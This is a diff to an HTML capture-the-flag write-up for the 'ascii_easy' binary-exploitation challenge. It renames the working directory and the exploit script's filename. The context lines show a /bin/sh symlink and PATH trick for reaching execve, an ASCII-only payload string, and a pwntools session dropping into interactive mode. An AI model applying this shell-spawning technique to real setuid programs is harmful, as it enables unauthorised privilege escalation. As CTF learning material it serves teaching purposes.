@@ -624,9 +624,9 @@ found an ascii address for calling execve! 0x55616967
         <p>I found the null-terminated string <code>"SJA"</code> at the address <code>0x55617b33</code>, which is ascii only.</p>
 
         <p>Now I create the symlink and update my PATH:</p>
-        <pre><code>cd /tmp/yael
+        <pre><code>cd /tmp/exp
 ln -s /bin/sh SJA
-export PATH=/tmp/yael:$PATH</code></pre>
+export PATH=/tmp/exp:$PATH</code></pre>
 
         <h4>Finding NULL Pointers</h4>
 
@@ -677,7 +677,7 @@ p.interactive()</code></pre>
 
         <p>Running it:</p>
 
-        <pre><code>ascii_easy@ubuntu:/tmp/yael$ python3 try.py
+        <pre><code>ascii_easy@ubuntu:/tmp/exp$ python3 exploit.py
 b'aaaabaaacaaadaaaeaaafaaagaaahaaajgaU3{aU;JVU;JVU'
 [+] Starting local process '/home/ascii_easy/ascii_easy': pid 516266
 [*] Switching to interactive mode
